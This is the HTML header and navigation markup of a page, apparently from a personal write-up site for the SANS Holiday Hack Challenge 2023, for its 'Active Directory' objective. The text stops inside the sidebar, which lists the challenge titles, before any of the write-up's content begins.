
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="Lukasz Sztukowski">
      
      
      
        <link rel="prev" href="../o18/">
      
      
        <link rel="next" href="../o20/">
      
      
      <link rel="icon" href="../../img/misc/favicon.ico">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.3">
    
    
      
        <title>Active Directory - SANS HHC 2023 Write-Up</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.50c56a3b.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../css/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="teal">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#active-directory" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="SANS HHC 2023 Write-Up" class="md-header__button md-logo" aria-label="SANS HHC 2023 Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M210.6 5.9 62 169.4c-3.9 4.2-6 9.8-6 15.5 0 12.8 10.3 23.1 23.1 23.1H104l-73.4 73.4c-4.2 4.2-6.6 10-6.6 16 0 12.5 10.1 22.6 22.6 22.6H80L5.4 409.5c-3.5 4.2-5.4 9.5-5.4 15 0 13 10.5 23.5 23.5 23.5H192v32c0 17.7 14.3 32 32 32s32-14.3 32-32v-32h168.5c13 0 23.5-10.5 23.5-23.5 0-5.5-1.9-10.8-5.4-15L368 320h33.4c12.5 0 22.6-10.1 22.6-22.6 0-6-2.4-11.8-6.6-16L344 208h24.9c12.7 0 23.1-10.3 23.1-23.1 0-5.7-2.1-11.3-6-15.5L237.4 5.9C234 2.1 229.1 0 224 0s-10 2.1-13.4 5.9z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SANS HHC 2023 Write-Up
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Active Directory
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="teal"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3 3.19.09m3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95 2.06.05m-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5c-.84 0-1.65.15-2.39.42L12 2M3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29L3.34 7m.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14L3.36 17M20.65 7l-1.77 3.79a7.023 7.023 0 0 0-2.38-4.15l4.15.36m-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29L20.64 17M12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44L12 22Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



  

<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="SANS HHC 2023 Write-Up" class="md-nav__button md-logo" aria-label="SANS HHC 2023 Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M210.6 5.9 62 169.4c-3.9 4.2-6 9.8-6 15.5 0 12.8 10.3 23.1 23.1 23.1H104l-73.4 73.4c-4.2 4.2-6.6 10-6.6 16 0 12.5 10.1 22.6 22.6 22.6H80L5.4 409.5c-3.5 4.2-5.4 9.5-5.4 15 0 13 10.5 23.5 23.5 23.5H192v32c0 17.7 14.3 32 32 32s32-14.3 32-32v-32h168.5c13 0 23.5-10.5 23.5-23.5 0-5.5-1.9-10.8-5.4-15L368 320h33.4c12.5 0 22.6-10.1 22.6-22.6 0-6-2.4-11.8-6.6-16L344 208h24.9c12.7 0 23.1-10.3 23.1-23.1 0-5.7-2.1-11.3-6-15.5L237.4 5.9C234 2.1 229.1 0 224 0s-10 2.1-13.4 5.9z"/></svg>

    </a>
    SANS HHC 2023 Write-Up
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Welcome
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Objectives
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Objectives
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Christmas Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            Christmas Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o1/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Holiday Hack Orientation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o2/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Snowball Fight
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o3/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Linux 101
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o4/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Reportinator
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o5/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Azure 101
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Island of Misfit Toys
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Island of Misfit Toys
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o6/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Luggage Lock
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o7/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Linux PrivEsc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o15/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Hashcat
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o8/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Game Cartridges Vol 1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o9/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Game Cartridges Vol 2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o10/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Game Cartridges Vol 3
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Film Noir Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Film Noir Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o11/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Naan
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o12/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    KQL Kraken Hunt
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o13/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Phish Detection Agency
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pixel Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            Pixel Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o14/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Elf Hunt
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o16/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Certificate SSHenanigans
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" checked>
        
          
          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Steampunk Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            Steampunk Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o17/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Faster Lock Combination
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o18/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    The Captain's Comms
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Active Directory
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Active Directory
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#objective" class="md-nav__link">
    <span class="md-ellipsis">
      Objective
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hints" class="md-nav__link">
    <span class="md-ellipsis">
      Hints
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    <span class="md-ellipsis">
      Solution
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#response" class="md-nav__link">
    <span class="md-ellipsis">
      Response
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
        
          
          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Space Island
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_6">
            <span class="md-nav__icon md-icon"></span>
            Space Island
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o20/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Space Island Door Access Speaker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o21/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Camera Access
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o22/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Missile Diversion
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
